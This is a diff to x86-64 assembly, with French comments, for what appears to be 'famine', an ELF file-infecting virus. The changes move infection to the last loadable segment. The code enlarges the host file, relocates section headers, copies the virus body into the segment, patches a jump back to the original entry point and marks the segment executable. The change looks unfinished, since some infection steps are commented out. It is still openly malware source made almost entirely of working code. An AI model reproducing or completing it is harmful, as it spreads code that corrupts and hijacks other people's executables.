@@ -26,6 +26,7 @@ get_file_data:
     
     xor rdi, rdi
     mov rsi, [r12 + fileSize]
+    add rsi, PROG_SIZE                      ; ajoute la taille du programe si on se met a le ragouter
     mov rdx, PROT_READ | PROT_WRITE
     mov r10, MAP_SHARED ; r10 est le 4 ieme argument car rcx et r11 sont détruit par le kernel
     mov r8, [r12 + fd]
@@ -96,57 +97,102 @@ get_file_entry:                     ; recupere l'entry point de l'executable
     mov [r12 + oldEntry], rdi
     
 
-get_first_pload:
+get_last_pload:
     mov r13, [r12 + fileData]     ; r13 = famine->filedata;
-    xor r14, r14                  ; mise a 0
+    xor rax, rax                  ; mise a 0
     xor rdi, rdi
+    xor rbx, rbx
+    xor rdx, rdx
     mov di, [r13 + e_phnum]
     mov rsi, [r13 + e_phoff]
-    xor rdx, rdx
     mov dx, [r13 + e_phentsize]
-    xor rax, rax
 phead_loop:
-    mov eax, [r13 + rsi + p_type]    ; boucle sur tout les pheader et quand on trouve le premier pload on sort de la boucle
-    cmp eax, PT_LOAD
-    jz first_pload_found
-    inc r14
+    cmp dword [r13 + rsi + p_type], PT_LOAD                    ; boucle sur tout les pheader et quand on trouve le premier pload on sort de la boucle
+    jnz no_pload
+    mov rbx, rsi
+    no_pload:
+    inc rax
     add rsi, rdx
-    cmp r14, rdi
+    cmp rax, rdi
     jl phead_loop
-    jmp close_mmap                    ;on quite si il n'y a pas de pload trouvé
-first_pload_found:                                                                                              ; faire un check pour voir si on a la place d'écrire 
-    add r13, rsi
+    cmp dword [r13 + rbx + p_type], PT_LOAD
+    jnz close_mmap                    ;on quite si il n'y a pas de pload trouvé
+last_pload_found:                                                                                              ; faire un check pour voir si on a la place d'écrire 
+    add r13, rbx
     mov [r12 + pload], r13
-check_pload_size:
-    xor rdx, rdx
-    mov rax, [r13 + p_filesz]
-    mov rdi, [r13 + p_align]
-    div rdi
-    sub rdi, rdx
-    cmp rdi, PROG_SIZE                      ; regarde si on a assez de place dans le bourrage et fait un simple append de la signature si on a pas assez
-    jl simple
-    mov rax, [r13 + p_filesz]
-    add rax, PROG_SIZE
-    mov rdi, [r12 + fileSize]
-    cmp rdi, rax
-    jl simple                               ; si le pload + le programe est plus grand que le fichier
+increase_file_size:
+    mov rdi, [r12 + fd]
+    mov rsi, [r12 + fileData]
+    mov rdx, 2048
+    mov rax, SYS_WRITE
+    syscall                     ;write(fd, filedata, PROG_SIZE);
+    
+relocate_section_header:
+    mov rsi, [r12 + fileData]
+    mov rdx, [r13 + p_offset]
+    add rdx, [r13 + p_filesz]
+    add rsi, rdx
+    mov rdi, rsi
 
+
+
+    mov rbx, rdi
+    
+    
+    
+    add rdi, 2048
+    mov rcx, [r12 + fileSize]
+    sub rcx, rdx
+    mov rdx, rcx
+    call ft_memrcpy
+    
+    mov rdi, rbx
+    mov rcx, rdx        ; int i = len
+    xor rax, rax        ; char c = '\0'
+    rep stosb           ; while (i--) s[i] = c
+
+change_header:
+    add qword [r12 + fileSize], 2048
+    mov rax, [r12 + fileData]
+    add qword [rax + e_shoff], 2048
+
+change_section_header:
+    xor rbx, rbx
+    xor rcx, rcx
+    xor rdx, rdx
+    mov rax, [r12 + fileData]
+    mov bx, [rax + e_shnum]
+    mov cx, [rax + e_shentsize]
+    add rax, [rax + e_shoff]
+    mov rsi, [r13 + p_offset]
+    add rsi, [r13 + p_filesz]
+    section_header_loop:
+    cmp [rax + sh_offset], rsi
+    jl no_section_change
+    add qword [rax + sh_offset], 2048
+    add qword [rax + sh_addr], 2048
+    no_section_change:
+    inc rdx
+    add rax, rcx
+    cmp rdx, rbx
+    jle section_header_loop
 
 write_virus_entry:
-    mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du premier pload = p_vaddr + p_memsz
+    mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du dernier pload = p_vaddr + p_memsz
     add rdi, [r13 + p_memsz]
     mov [r12 + entry], rdi
     mov rsi, [r12 + fileData]           ; écrit la nouvelle entry dans l'executable
-    mov [rsi + e_entry], rdi
+;    mov [rsi + e_entry], rdi
 
 
 copy_program:
     mov rdi, [r12 + fileData]               ; address a la fin du premier pload
+    add rdi, [r13 + p_offset]
     add rdi, [r13 + p_filesz]
     mov rbx, rdi
     lea rsi, [rel main]                     ; address du debut du programe
     mov rcx, PROG_SIZE                      ; taille du programe
-    rep movsb
+;    rep movsb
     
     ; calcule le jump qu'il faut faire pour attendre l'entry normale 
     mov rdx, [r12 + entry]
@@ -157,11 +203,10 @@ copy_program:
     ; ecrit le jump a l'adress de jump
     mov [rbx + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
     mov [rbx + JMP_OFFSET + 1], ecx
-
     ; augmente la taille du premier pload
-    add qword [r13 + p_memsz], PROG_SIZE
-    add qword [r13 + p_filesz], PROG_SIZE
-    
+    add qword [r13 + p_memsz], 2048
+    add qword [r13 + p_filesz], 2048
+
     or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
     
 close_mmap:
